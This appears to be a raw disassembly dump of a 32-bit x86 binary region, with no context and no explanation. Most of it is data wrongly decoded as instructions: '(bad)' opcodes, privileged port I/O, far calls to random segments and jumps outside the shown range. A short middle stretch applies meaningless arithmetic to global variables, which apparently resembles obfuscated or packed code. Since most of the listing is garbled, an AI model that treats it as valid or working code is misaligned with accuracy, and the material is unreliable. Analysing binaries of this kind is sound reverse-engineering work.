  4031f6:	out    dx,al
  4031f7:	inc    DWORD PTR ds:0xc716a9d2
  4031fd:	xchg   ebp,eax
  4031fe:	adc    esi,ecx
  403200:	pop    eax
  403201:	inc    DWORD PTR [ebp-0x628697fd]
  403207:	add    BYTE PTR [ebx],dh
  403209:	jmp    0x40319f
  40320b:	(bad)  
  40320d:	(bad)  
  40320e:	mov    ch,0x97
  403210:	rcr    ebx,1
  403212:	call   0x7d3f:0x8750ef94
  403219:	aam    0x94
  40321b:	imul   ebx,DWORD PTR [edi],0xf
  40321e:	sbb    eax,0xaf99df17
  403223:	xchg   esp,eax
  403224:	sub    ecx,DWORD PTR [edi+eax*4+0x49]
  403228:	jle    0x403298
  40322a:	cmp    esp,DWORD PTR [edi]
  40322c:	rcr    BYTE PTR [esi-0x2],cl
  40322f:	aad    0xb9
  403231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403232:	fdiv   st,st(0)
  403234:	(bad)  
  403235:	sbb    al,ah
  403237:	xchg   ebx,eax
  403238:	jge    0x4031bf
  40323a:	add    ecx,DWORD PTR [edx+0x5]
  40323d:	xchg   ebx,eax
  40323e:	mul    BYTE PTR [edx-0x1a303457]
  403244:	adc    al,0x17
  403246:	cdq    
  403247:	and    esi,DWORD PTR [edi+eiz*1-0x1c]
  40324b:	fbstp  TBYTE PTR [edi+eiz*4]
  40324e:	mov    eax,ds:0x82e6f205
  403253:	ret    
  403254:	pop    ds
  403255:	popa   
  403256:	pop    es
  403257:	cmp    al,0x8a
  403259:	int3   
  40325a:	imul   esi,DWORD PTR [eax+esi*2-0x3a101564],0x14d99f07
  403265:	ror    BYTE PTR [ebx],cl
  403267:	std    
  403268:	pop    ss
  403269:	sbb    al,0xff
  40326b:	or     eax,0x446ac54b
  403270:	mov    bl,0x33
  403272:	(bad)  [esi+0x661f87d1]
  403278:	mov    dh,0x2b
  40327a:	mov    eax,DWORD PTR [ebp+0x4a]
  40327d:	xor    BYTE PTR [ebx+ecx*4],cl
  403280:	pusha  
  403281:	and    al,0xc7
  403283:	cld    
  403284:	(bad)  
  403285:	dec    edi
  403286:	popa   
  403287:	std    
  403288:	jno    0x40329b
  40328a:	fiadd  WORD PTR [esi+edi*8+0x17fa81dc]
  403291:	rcl    DWORD PTR [esi],cl
  403293:	shl    dh,cl
  403295:	iret   
  403296:	cmp    DWORD PTR [edx+0x5],eax
  403299:	cdq    
  40329a:	dec    ebp
  40329b:	lahf   
  40329c:	mov    bh,0x6d
  40329e:	or     al,0xbd
  4032a0:	ror    BYTE PTR [edi],1
  4032a2:	sbb    al,0xab
  4032a4:	jns    0x40327c
  4032a6:	test   DWORD PTR [esi-0x49],edx
  4032a9:	sub    bl,BYTE PTR [ebx+0x5864747a]
  4032af:	mov    ch,0xe6
  4032b1:	test   BYTE PTR [ebx-0x19ed03c3],cl
  4032b7:	push   eax
  4032b8:	mov    ebx,0xe3b8b54c
  4032bd:	in     eax,dx
  4032be:	and    al,0xf8
  4032c0:	xchg   ebp,eax
  4032c1:	nop
  4032c2:	push   0x2cd9c5b2
  4032c7:	jmp    0xe1ce:0xd5f234fc
  4032ce:	push   ds
  4032cf:	idiv   DWORD PTR ds:0x6845dd9
  4032d5:	dec    ecx
  4032d6:	fnstcw WORD PTR [ecx-0x62ccfa48]
  4032dc:	enter  0xfc46,0xc6
  4032e0:	adc    dh,ah
  4032e2:	jge    0x4032b1
  4032e4:	jmp    0x73e84f4d
  4032e9:	idiv   BYTE PTR [edx+0x17]
  4032ec:	daa    
  4032ed:	(bad)
  4032f0:	into   
  4032f1:	mov    al,0xcd
  4032f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032f4:	fadd   DWORD PTR [ecx+0x28bf8ba1]
  4032fa:	adc    dh,BYTE PTR [edx]
  4032fc:	fdivr  DWORD PTR [esi-0x5]
  4032ff:	sti    
  403300:	out    0xfc,eax
  403302:	loopne 0x40328c
  403304:	pop    esi
  403305:	and    dl,BYTE PTR [ecx-0x50]
  403308:	jge    0x40330a
  40330a:	rol    BYTE PTR [ebx+0x1b],1
  40330d:	shl    DWORD PTR [edx],0x81
  403310:	push   0xffffffea
  403312:	iret   
  403313:	mov    cl,0x9b
  403315:	dec    ebp
  403316:	add    ch,BYTE PTR ds:0x8dce3c54
  40331c:	xchg   esi,eax
  40331d:	push   ebx
  40331e:	lahf   
  40331f:	push   0x9b595a91
  403324:	pop    ds
  403325:	push   cs
  403326:	fnstcw WORD PTR [eax-0x7]
  403329:	idiv   BYTE PTR [edx+0x67]
  40332c:	aaa    
  40332d:	lods   al,BYTE PTR ds:[esi]
  40332e:	mov    ecx,0x139bfa08
  403333:	mov    ds:0x328feb26,eax
  403338:	imul   ebp,DWORD PTR [ebp-0x1a],0x20cc171a
  40333f:	cmp    al,0x32
  403341:	and    BYTE PTR [ebp+0xe9a2f7c],ch
  403347:	push   eax
  403348:	and    edx,DWORD PTR [ebp+0x2f]
  40334b:	aaa    
  40334c:	(bad)  
  40334d:	xor    al,ch
  40334f:	in     al,0xa2
  403351:	xor    bh,BYTE PTR [edx-0x5a]
  403354:	loope  0x40331e
  403356:	dec    eax
  403357:	ret    
  403358:	push   eax
  403359:	xor    dh,BYTE PTR [edx-0x15]
  40335c:	into   
  40335d:	push   es
  40335e:	inc    ebx
  40335f:	and    al,0x37
  403361:	mov    ebp,0x6a6357e5
  403366:	adc    eax,0x47ae4e8
  40336b:	cmp    ch,bh
  40336d:	ds dec eax
  40336f:	outs   dx,DWORD PTR ds:[esi]
  403370:	inc    ecx
  403371:	push   ss
  403372:	jg     0x4033d3
  403374:	out    dx,eax
  403375:	pop    ebp
  403376:	lods   al,BYTE PTR ds:[esi]
  403377:	test   al,0xa
  403379:	and    WORD PTR ds:0xdfcbf077,0xb6c1
  403382:	push   ss
  403383:	and    al,0x24
  403385:	nop
  403386:	or     BYTE PTR [edi],dh
  403388:	sti    
  403389:	dec    ebp
  40338a:	test   al,0x5b
  40338c:	clc    
  40338d:	inc    eax
  40338e:	gs test al,0xee
  403391:	dec    ebx
  403392:	sub    bl,BYTE PTR [ecx+0x2a]
  403395:	retf   
  403396:	dec    ecx
  403397:	xchg   edi,eax
  403398:	outs   dx,BYTE PTR ds:[esi]
  403399:	shl    BYTE PTR [edi-0x37],cl
  40339c:	sbb    DWORD PTR [ecx-0x208195ac],0x1b
  4033a3:	fisttp DWORD PTR [ebx+edi*8+0x404af872]
  4033aa:	jle    0x403334
  4033ac:	pop    edi
  4033ad:	mov    ebx,0x37065a1d
  4033b2:	jecxz  0x40340d
  4033b4:	sar    DWORD PTR [ebx-0x46],0x92
  4033b8:	push   edi
  4033b9:	lea    edi,[ebx+0x34913605]
  4033bf:	or     eax,0x227158d3
  4033c4:	cs push edx
  4033c6:	sbb    eax,0x254a612e
  4033cb:	ficomp DWORD PTR [edi+0x1b257ced]
  4033d1:	or     ah,BYTE PTR [edx-0x6c]
  4033d4:	add    edi,esi
  4033d6:	sbb    eax,0xd1b29579
  4033db:	push   ebp
  4033dc:	test   BYTE PTR [eax+0x7c],dh
  4033df:	mov    ch,0x55
  4033e1:	stc    
  4033e2:	xor    esi,DWORD PTR [eax]
  4033e4:	pop    ebx
  4033e5:	sub    BYTE PTR [esi-0x5f],bl
  4033e8:	cld    
  4033e9:	jmp    0x5695:0x8cb9edc
  4033f0:	mov    es,WORD PTR [edx-0x46]
  4033f3:	inc    edx
  4033f4:	mov    edi,0x640935b4
  4033f9:	ret    0xc4
  4033fc:	cmp    eax,0x75a53437
  403401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403402:	sbb    al,0x88
  403404:	lds    eax,FWORD PTR [ecx]
  403406:	sub    ebx,DWORD PTR [ecx-0x770366ba]
  40340c:	enter  0x49db,0xe1
  403410:	sti    
  403411:	cmp    edx,DWORD PTR [edi+0x5e]
  403414:	inc    ebp
  403415:	cs adc eax,0x6e10b5a2
  40341b:	(bad)  
  40341c:	iret   
  40341d:	xlat   BYTE PTR ds:[ebx]
  40341e:	cmc    
  40341f:	std    
  403420:	test   al,0xe0
  403422:	inc    eax
  403423:	js     0x4033b6
  403425:	cs add al,0x7
  403428:	ret    
  403429:	mov    cl,0xa
  40342b:	retf   
  40342c:	mov    al,ds:0x26335f58
  403431:	cmp    BYTE PTR [edi],bh
  403433:	iret   
  403434:	rcr    DWORD PTR [ebp-0x73],0xdf
  403438:	fdivr  DWORD PTR [eax+0x45]
  40343b:	cmp    ebp,edx
  40343d:	out    0x42,eax
  40343f:	data16 cmp BYTE PTR [ecx],al
  403442:	in     al,dx
  403443:	xchg   ebx,eax
  403444:	push   0xf4ad0a61
  403449:	iret   
  40344a:	hlt    
  40344b:	or     dh,dh
  40344d:	jmp    0x2c287c77
  403452:	mov    BYTE PTR ds:0x22aebbbf,0x0
  403459:	sar    BYTE PTR [edx-0x625fe341],1
  40345f:	xchg   edi,eax
  403460:	lods   al,BYTE PTR ds:[esi]
  403461:	dec    eax
  403462:	xchg   esp,eax
  403463:	pop    ss
  403464:	cmp    BYTE PTR [eax+0x54cfde7f],cl
  40346a:	nop
  40346b:	pop    edx
  40346c:	adc    DWORD PTR [ebx],eax
  40346e:	mov    WORD PTR [ecx+0x41],ss
  403471:	xor    DWORD PTR [edx-0x33],ecx
  403474:	sub    al,0xab
  403476:	and    al,0xec
  403479:	mov    al,0x5c
  40347b:	(bad)  
  40347c:	push   ss
  40347d:	pop    ebp
  40347e:	dec    eax
  40347f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403480:	push   ds
  403481:	in     al,0x3e
  403483:	ja     0x4034db
  403485:	shl    BYTE PTR [edx+eiz*4-0x53ff2181],cl
  40348c:	pop    esi
  40348d:	and    DWORD PTR [esi+0x33fce385],esi
  403493:	push   ebp
  403494:	mov    cl,0x5c
  403496:	into   
  403497:	xchg   esp,eax
  403498:	cmp    al,0xbc
  40349a:	add    DWORD PTR [ecx+0x249bbd97],ebx
  4034a0:	ja     0x403500
  4034a2:	cmp    eax,edi
  4034a4:	or     bh,BYTE PTR [ecx+0x4fa7127e]
  4034aa:	sbb    eax,0x5bac3b5f
  4034af:	in     al,dx
  4034b0:	cmp    eax,0xccd7082b
  4034b5:	int3   
  4034b6:	xor    eax,0x69e3b01d
  4034bb:	test   bh,al
  4034bd:	shl    BYTE PTR ds:0x1235d279,cl
  4034c3:	mov    BYTE PTR [ecx+ebx*1],ch
  4034c6:	outs   dx,DWORD PTR ds:[esi]
  4034c7:	sbb    ah,BYTE PTR [edi]
  4034c9:	push   cs
  4034ca:	pop    esp
  4034cb:	mov    eax,DWORD PTR [ecx+eiz*1+0x1b]
  4034cf:	xchg   ecx,eax
  4034d0:	cmp    BYTE PTR [ecx-0x26],al
  4034d3:	icebp  
  4034d4:	popf   
  4034d5:	inc    BYTE PTR [ebx]
  4034d7:	leave  
  4034d8:	fst    QWORD PTR [esi+0x23]
  4034db:	mov    ds:0x1ed97fa7,al
  4034e0:	xchg   di,ax
  4034e2:	xlat   BYTE PTR ds:[ebx]
  4034e3:	add    esp,DWORD PTR [ecx-0x5b]
  4034e6:	inc    edi
  4034e7:	jecxz  0x4034bd
  4034e9:	in     eax,0x4
  4034eb:	loopne 0x403521
  4034ed:	inc    edx
  4034ee:	dec    esi
  4034ef:	pusha  
  4034f0:	scas   al,BYTE PTR es:[edi]
  4034f1:	loopne 0x403474
  4034f3:	pop    esi
  4034f4:	add    BYTE PTR [ebp+0x35],ah
  4034f7:	inc    esp
  4034f8:	fdivr  st(7),st
  4034fa:	and    al,0x8b
  4034fc:	test   eax,0xbfa704dc
  403501:	sbb    al,BYTE PTR [edi]
  403503:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403505:	retf   0x2bca
  403508:	jecxz  0x4034f7
  40350a:	(bad)  
  40350b:	push   edi
  40350c:	pop    ebp
  40350d:	popf   
  40350e:	int    0x60
  403510:	ins    DWORD PTR es:[edi],dx
  403511:	pop    edi
  403512:	and    BYTE PTR [edx-0x24],ch
  403515:	inc    edi
  403516:	les    edi,FWORD PTR [ecx+0x15]
  403519:	int3   
  40351a:	pusha  
  40351b:	addr16 push ds
  40351d:	mov    eax,ds:0xc75c4449
  403522:	xor    eax,0x5d4a6e31
  403527:	pop    ds
  403528:	aad    0x3d
  40352a:	cmp    eax,0xa4933cba
  40352f:	inc    ecx
  403530:	shl    DWORD PTR [eax],cl
  403532:	inc    esi
  403533:	(bad)  
  403534:	or     cl,BYTE PTR [edi-0x4e]
  403537:	test   BYTE PTR [edi+0x45],0xfd
  40353b:	and    esp,DWORD PTR [ecx]
  40353d:	add    BYTE PTR [edi],bh
  40353f:	shr    ah,0xf2
  403542:	aam    0x62
  403544:	push   0x23
  403546:	mov    ch,0xb9
  403548:	cmp    al,0xc4
  40354a:	ret    0x7b8d
  40354d:	xchg   esp,eax
  40354e:	mov    edi,0x778734b2
  403553:	and    edx,esi
  403555:	(bad)  
  403556:	fcomp  DWORD PTR [edx]
  403558:	pop    esp
  403559:	pop    esi
  40355a:	sub    al,0xb0
  40355c:	cmp    ecx,DWORD PTR [esi+edx*4]
  40355f:	mov    al,0x85
  403561:	stos   BYTE PTR es:[edi],al
  403562:	ins    BYTE PTR es:[edi],dx
  403563:	add    al,0xa6
  403565:	dec    esi
  403566:	jle    0x40353e
  403568:	mov    ds:0x621ad9e0,eax
  40356d:	icebp  
  40356e:	aad    0xbf
  403570:	mov    bh,0x57
  403572:	(bad)  
  403573:	mov    bh,0x25
  403575:	jns    0x4035d1
  403577:	cmc    
  403578:	pop    ebx
  403579:	mov    DWORD PTR [ebx],esp
  40357b:	or     al,0x52
  40357d:	push   ecx
  40357e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40357f:	inc    edx
  403580:	scas   al,BYTE PTR es:[edi]
  403581:	push   ds
  403582:	mov    eax,ds:0x9332b6de
  403587:	dec    edi
  403588:	retf   
  403589:	mov    al,ds:0x6a962e46
  40358e:	mov    ch,0x61
  403590:	jns    0x40355b
  403592:	mov    eax,0x713f4285
  403597:	rol    DWORD PTR [esi+eax*8],1
  40359a:	rcl    DWORD PTR [edx-0x6a],1
  40359d:	jbe    0x4035df
  40359f:	into   
  4035a0:	and    al,0xbc
  4035a2:	push   ebp
  4035a3:	mov    ds:0x788e0aae,al
  4035a8:	out    dx,eax
  4035a9:	fwait
  4035aa:	sbb    eax,0xe262549e
  4035af:	in     al,dx
  4035b0:	inc    edi
  4035b1:	sbb    DWORD PTR [edx-0x5eb2d20e],esp
  4035b7:	add    DWORD PTR [edi-0x4d4d18a0],ebx
  4035bd:	(bad)
  4035c1:	xchg   ebx,eax
  4035c2:	push   es
  4035c3:	imul   esp,edi,0xb27bb5b9
  4035c9:	ret    
  4035ca:	addr16 sahf 
  4035cc:	mov    eax,ds:0x90f1fa82
  4035d1:	es out 0xce,eax
  4035d4:	xor    eax,esp
  4035d6:	out    0x58,eax
  4035d8:	cld    
  4035d9:	in     eax,dx
  4035da:	aaa    
  4035db:	cld    
  4035dc:	(bad)  
  4035de:	mov    esi,DWORD PTR [esi+0x12]
  4035e1:	xor    eax,0x2f0df38a
  4035e6:	or     bl,BYTE PTR [edi+ecx*1]
  4035e9:	xor    dl,ah
  4035eb:	leave  
  4035ec:	fstp   QWORD PTR [eax-0x51]
  4035ef:	popa   
  4035f0:	std    
  4035f1:	add    DWORD PTR [edx+eiz*2],ebp
  4035f4:	fbld   TBYTE PTR [esi]
  4035f6:	push   ebx
  4035f7:	enter  0x9d20,0x8
  4035fb:	fwait
  4035fc:	mov    ebx,0xe89b6983
  403601:	jo     0x40359c
  403603:	imul   ebx,DWORD PTR [eax-0x577af1b7],0x34
  40360a:	stc    
  40360b:	sbb    ecx,DWORD PTR [ebx+0x11]
  40360e:	xchg   esp,eax
  40360f:	imul   eax,DWORD PTR [edi-0x4],0xffffffc4
  403613:	pop    ss
  403614:	imul   edx,ecx,0x8885b4ad
  40361a:	push   esp
  40361b:	add    eax,0x9c929120
  403620:	jecxz  0x40368c
  403622:	out    dx,eax
  403623:	cmp    al,cl
  403625:	and    eax,DWORD PTR [edx*1+0x71da15cd]
  40362c:	and    al,0xf4
  40362e:	imul   dh
  403630:	bound  ecx,QWORD PTR [ebx]
  403632:	aaa    
  403633:	shl    BYTE PTR [ebp-0x66d14f7b],0xac
  40363a:	and    eax,DWORD PTR [edx-0x51124173]
  403640:	add    al,0x6
  403642:	xor    al,BYTE PTR [edi-0x32]
  403645:	mov    bl,0x2f
  403647:	push   esp
  403648:	jbe    0x40366f
  40364a:	scas   eax,DWORD PTR es:[edi]
  40364b:	dec    edi
  40364c:	jmp    0x8b85:0xc31489b9
  403653:	mov    edi,0x53d021b8
  403658:	jb     0x4035fd
  40365a:	ficomp DWORD PTR [ebx]
  40365c:	pop    esi
  40365d:	outs   dx,BYTE PTR cs:[esi]
  40365f:	test   BYTE PTR [edi+0x58],bh
  403662:	std    
  403663:	push   cs
  403664:	sbb    ch,BYTE PTR [esi]
  403666:	scas   eax,DWORD PTR es:[edi]
  403667:	sbb    BYTE PTR [ecx-0x56ad4f68],al
  40366d:	cmp    BYTE PTR [edx],al
  40366f:	std    
  403670:	lods   al,BYTE PTR ds:[esi]
  403671:	sub    DWORD PTR [esi+0x2a],ecx
  403674:	inc    esp
  403675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403676:	push   cs
  403677:	sub    eax,0x3a2e1087
  40367c:	dec    edx
  40367d:	rcl    BYTE PTR ds:0x4d56d7bb,cl
  403683:	dec    edi
  403684:	sub    al,0x66
  403686:	sbb    DWORD PTR [edx-0x50],esi
  403689:	call   0xb96a:0x8d802bff
  403690:	xor    BYTE PTR [ebp+eax*4-0x32],0xa6
  403695:	test   DWORD PTR [ecx+edi*4],0xfa7e6267
  40369c:	les    edi,FWORD PTR [ecx-0x59]
  40369f:	jmp    0x4036c1
  4036a1:	dec    ecx
  4036a2:	jnp    0x4036e2
  4036a4:	push   esp
  4036a5:	push   edx
  4036a6:	scas   eax,DWORD PTR es:[edi]
  4036a7:	int    0x2a
  4036a9:	jnp    0x403673
  4036ab:	mov    WORD PTR [esp+eax*4+0x556ba3d2],?
  4036b2:	dec    ebp
  4036b3:	les    esp,FWORD PTR [eax+0x4ea0b1c7]
  4036b9:	inc    esi
  4036ba:	das    
  4036bb:	pop    edi
  4036bc:	imul   BYTE PTR [ecx]
  4036be:	mov    fs,WORD PTR [ecx+eiz*8]
  4036c1:	mov    ch,0x16
  4036c3:	mov    ebp,0x8f532d39
  4036c8:	sub    edx,DWORD PTR [ecx+0x6f]
  4036cb:	and    DWORD PTR [esi+0xbd6b03e],esp
  4036d1:	stc    
  4036d2:	clc    
  4036d3:	inc    edx
  4036d4:	lds    esp,FWORD PTR [ecx]
  4036d6:	and    edx,DWORD PTR [ebx+0x3e2651a0]
  4036dc:	mov    dh,0x33
  4036de:	and    BYTE PTR [eax],ah
  4036e0:	fld    TBYTE PTR [eax-0x5]
  4036e3:	ret    0x33a5
  4036e6:	imul   edi,DWORD PTR [edx],0xffffffd4
  4036e9:	add    dl,BYTE PTR [edi]
  4036eb:	jle    0x403672
  4036ed:	inc    ebx
  4036ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036ef:	arpl   sp,di
  4036f1:	and    dh,BYTE PTR ds:0xf6c66f7e
  4036f7:	test   DWORD PTR [ebx*8-0x40add28e],esp
  4036fe:	test   edx,edi
  403700:	cmp    DWORD PTR [edx],ecx
  403702:	xchg   edx,edx
  403704:	repnz daa 
  403706:	fstp   TBYTE PTR [edi+0x65a67e5b]
  40370c:	imul   edx,edi,0x392f0822
  403712:	inc    ebp
  403713:	push   eax
  403714:	xchg   edx,eax
  403715:	enter  0x9753,0x81
  403719:	jmp    0x4036fa
  40371b:	xchg   ecx,eax
  40371c:	inc    ebp
  40371d:	xchg   esi,eax
  40371e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403721:	cmp    DWORD PTR ds:0x42291a,0x0
  403728:	not    DWORD PTR ds:0x42292a
  40372e:	mov    edx,0x5d13
  403733:	movzx  edx,WORD PTR ds:0x42288a
  40373a:	jmp    0x403780
  40373f:	mov    DWORD PTR ds:0x4229aa,0xf15
  403749:	jg     0x40376e
  40374f:	push   DWORD PTR [ebp-0xc]
  403752:	call   DWORD PTR ds:0x42a174
  403758:	add    DWORD PTR ds:0x4228d2,ebx
  40375e:	xor    DWORD PTR ds:0x42296a,edi
  403764:	sub    DWORD PTR ds:0x4228ea,0x49b7
  40376e:	sub    edx,DWORD PTR ds:0x4228ca
  403774:	or     DWORD PTR ds:0x4228ce,edi
  40377a:	xor    DWORD PTR ds:0x4228f2,ebx
  403780:	mov    edx,DWORD PTR [ebp-0x2c]
  403783:	or     DWORD PTR ds:0x422942,0x4409
  40378d:	or     ecx,0x4f00
  403793:	and    ecx,edx
  403795:	mov    edx,DWORD PTR ds:0x422892
  40379b:	adc    edx,DWORD PTR ds:0x4229b6
  4037a1:	mov    DWORD PTR ds:0x422892,edx
  4037a7:	mov    edx,DWORD PTR [ebp-0x34]
  4037aa:	adc    DWORD PTR ds:0x4229b2,0x1e82
  4037b4:	or     ecx,edx
  4037b6:	adc    DWORD PTR ds:0x4228ba,0x5785
  4037c0:	xor    ecx,0x5fdd
  4037c6:	cmp    ecx,DWORD PTR [eax]
  4037c8:	jne    0x41a17f
  4037ce:	and    DWORD PTR ds:0x42297a,0x68cd
  4037d8:	mov    ecx,DWORD PTR [esi]
  4037da:	sub    DWORD PTR ds:0x42297a,0x1779
  4037e4:	mov    eax,DWORD PTR [esi+0x4]
  4037e7:	and    edx,0xf6b
  4037ed:	shrd   ecx,eax,0x2
  4037f1:	shr    eax,0x2
  4037f4:	sbb    edx,DWORD PTR ds:0x4228e2
  4037fa:	mov    eax,DWORD PTR [esi]
  4037fc:	and    edx,DWORD PTR ds:0x4229d2
  403802:	mov    edx,DWORD PTR [esi+0x4]
  403805:	shl    eax,0x1e
  403808:	add    DWORD PTR ds:0x4229ae,0x4229ca
  403812:	xor    ecx,edi
  403814:	sub    DWORD PTR ds:0x42292a,0x2cc5
  40381e:	jmp    0x403da8
  403823:	add    al,0xf4
  403825:	sbb    al,0x30
  403827:	sbb    al,0x28
  403829:	clc    
  40382a:	sbb    BYTE PTR [ecx+edi*2],ch
  40382d:	jb     0x4038a1
  40382f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403830:	jns    0x403827
  403832:	push   0x1616d723
  403837:	cmp    eax,0x13161604
  40383c:	(bad)  
  40383d:	jo     0x403853
  40383f:	out    0xe0,al
  403841:	(bad)  
  403843:	xlat   BYTE PTR ds:[ebx]
  403844:	ins    BYTE PTR es:[edi],dx
  403845:	les    edi,FWORD PTR [edi+0x7afe16cf]
  40384b:	pop    ss
  40384c:	je     0x403811
  40384e:	dec    edi
  40384f:	out    0x18,eax
  403851:	arpl   WORD PTR [ebx-0x50b08f94],bp
  403857:	inc    ebp
  403858:	mov    esi,esi
  40385a:	retf   0xab3b
  40385d:	or     ebp,DWORD PTR [edi+0x1d93042a]
  403863:	ficom  DWORD PTR [edi]
  403865:	je     0x403867
  403867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403868:	into   
  403869:	push   cs
  40386a:	fisub  DWORD PTR [eax-0x11f1e6c]
  403870:	fiadd  WORD PTR [edi+0x67]
  403873:	push   edx
  403874:	test   al,0xe7
  403876:	inc    edx
  403877:	imul   esi,eax,0xffffffed
  40387a:	xchg   esp,eax
  40387b:	inc    eax
  40387c:	call   0xebe2:0xbf81349a
  403883:	pop    edi
  403884:	adc    al,bl
  403886:	outs   dx,BYTE PTR ds:[esi]
  403887:	jnp    0x4038d8
  403889:	call   0xaf6:0xdd19782a
  403890:	nop
  403891:	push   ecx
  403892:	jo     0x403845
  403894:	jmp    0x403906
  403896:	cli    
  403897:	mov    dh,BYTE PTR [edi]
  403899:	int    0xc2
  40389b:	mov    edi,0x3113e8e1
  4038a0:	loop   0x4038a0
  4038a2:	inc    edi
  4038a3:	xchg   edi,eax
  4038a4:	bound  edi,QWORD PTR [edi-0x3b1852f2]
  4038aa:	jno    0x4038f9
  4038ac:	push   ds
  4038ad:	cmp    ch,dl
  4038af:	xchg   ecx,eax
  4038b0:	ins    DWORD PTR es:[edi],dx
  4038b1:	mov    esp,0xbc6d1b7b
  4038b6:	adc    DWORD PTR [eax+esi*4-0x23],ecx
  4038ba:	std    
  4038bb:	sti    
  4038bc:	push   ds
  4038bd:	mov    bh,0x46
  4038bf:	mov    bh,0x7e
  4038c1:	jb     0x403911
  4038c3:	pop    esp
  4038c4:	mov    bh,0xdd
  4038c6:	xor    ebp,DWORD PTR [edx-0x2a3b8236]
  4038cc:	repnz ud2 
  4038cf:	jo     0x403916
  4038d1:	scas   al,BYTE PTR es:[edi]
  4038d2:	lahf   
  4038d3:	jg     0x4038be
  4038d5:	call   0x18d10b93
  4038da:	neg    BYTE PTR [edi]
  4038dc:	in     al,0x8c
  4038de:	push   es
  4038df:	iret   
  4038e0:	sbb    edx,ebp
  4038e2:	test   al,0x35
  4038e4:	lahf   
  4038e5:	cmp    ah,bh
  4038e7:	inc    ecx
  4038e8:	arpl   si,cx
  4038ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038eb:	fidivr WORD PTR [ebp+0x7f]
  4038ee:	ds pop esi
  4038f0:	arpl   WORD PTR [eax],di
  4038f2:	mov    bl,0x2
  4038f4:	mov    DWORD PTR [ebx],ebp
  4038f6:	(bad)  
  4038f7:	xchg   esi,eax
  4038f8:	fisttp QWORD PTR [ecx-0x2b57e686]
  4038fe:	outs   dx,DWORD PTR ds:[esi]
  4038ff:	adc    BYTE PTR [ebp+edi*1-0x2b9b300c],0x16
  403907:	shr    BYTE PTR [ecx+0x24],0x9a
  40390b:	adc    edi,DWORD PTR [edx-0x43c17048]
  403911:	xchg   ebx,eax
  403912:	xlat   BYTE PTR ds:[ebx]
  403913:	cmc    
  403914:	ficomp DWORD PTR [edx]
  403916:	and    eax,0x3b39f067
  40391b:	xchg   edx,eax
  40391c:	loope  0x403932
  40391e:	loopne 0x40397c
  403920:	xchg   BYTE PTR [ebp-0x1d],bh
  403923:	pop    esi
  403924:	or     eax,0x70990d24
  403929:	addr16 shl cl,cl
  40392c:	cli    
  40392d:	sub    BYTE PTR [edi+0xc],ch
  403930:	mov    al,0xe3
  403932:	jo     0x403995
  403934:	push   ecx
  403935:	dec    esp
  403936:	imul   edx,edi,0xaff88ebd
  40393c:	cmovns eax,DWORD PTR [edx-0xb1d108d]
  403943:	jb     0x403989
  403945:	push   ebx
  403946:	ret    
  403947:	test   eax,0xda3eab24
  40394c:	sub    al,0x72
  40394e:	xor    bl,BYTE PTR [ebx+0x56a32fcf]
  403954:	xchg   esp,eax
  403955:	pop    ecx
  403956:	cs jns 0x4038de
  403959:	sbb    ebx,ecx
  40395b:	xor    ebp,DWORD PTR [ebx+0x33]
  40395e:	jmp    DWORD PTR [esi]
  403960:	and    bh,BYTE PTR [ebx+0x28]
  403963:	js     0x4039d0
  403965:	inc    edi
  403966:	hlt    
  403967:	outs   dx,DWORD PTR ds:[esi]
  403968:	sub    ch,BYTE PTR [ecx+0x78e84f88]
  40396e:	imul   esi,DWORD PTR [edx],0xffffffa3
  403971:	cdq    
  403972:	scas   al,BYTE PTR es:[edi]
  403973:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403975:	xchg   DWORD PTR [edx],eax
  403977:	ins    DWORD PTR es:[edi],dx
  403978:	cmp    BYTE PTR [edx-0x49],dl
  40397b:	addr16 mov cl,0xb8
  40397e:	cmp    esi,DWORD PTR [eax+0x66]
  403981:	jnp    0x4039ce
  403983:	adc    BYTE PTR [eax+eax*2+0x6adc4067],0x7c
  40398b:	pop    es
  40398c:	dec    ebx
  40398d:	push   0x193d0323
  403992:	jp     0x403a00
  403994:	add    dh,0x84
  403997:	mov    bh,BYTE PTR [eax-0x19]
  40399a:	mov    BYTE PTR [eax],ah
  40399c:	lods   al,BYTE PTR ds:[esi]
  40399d:	mov    ?,esi
  40399f:	jg     0x4039e1
  4039a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a2:	or     eax,0xd6aa5d4d
  4039a7:	es ins DWORD PTR es:[edi],dx
  4039a9:	xlat   BYTE PTR ds:[ebx]
  4039aa:	loope  0x4039b9
  4039ac:	imul   ebx,DWORD PTR [esi+0x10d20c38],0x42
  4039b3:	mov    DWORD PTR [eax+0x62],esi
  4039b6:	jge    0x4039e3
  4039b8:	or     al,0xa
  4039ba:	fst    QWORD PTR [edi+0x6eefdaaf]
  4039c0:	rol    BYTE PTR [ecx-0x4],cl
  4039c3:	add    DWORD PTR [eax+0x71],ecx
  4039c6:	rcr    BYTE PTR [edx+0x28],cl
  4039c9:	ficom  DWORD PTR [ebp+0x68]
  4039cc:	xor    dh,dh
  4039ce:	retf   
  4039cf:	dec    edi
  4039d0:	outs   dx,BYTE PTR ds:[esi]
  4039d1:	jge    0x4039f7
  4039d3:	or     dl,BYTE PTR ds:[esi+edx*8+0x150d9b9e]
  4039db:	mov    dh,0xc3
  4039dd:	and    al,0x30
  4039df:	mov    al,ds:0xb33c385e
  4039e4:	xchg   BYTE PTR [ebx-0x10],al
  4039e7:	into   
  4039e8:	cli    
  4039e9:	les    edx,FWORD PTR [edx+0x46]
  4039ec:	xchg   edx,eax
  4039ed:	mov    bh,0xc4
  4039ef:	pusha  
  4039f0:	dec    ebx
  4039f1:	in     eax,0x6a
  4039f3:	rcr    edi,cl
  4039f5:	out    0x9e,al
  4039f7:	repnz fsubp st(2),st
  4039fa:	repz push esp
  4039fc:	mov    dl,0x9f
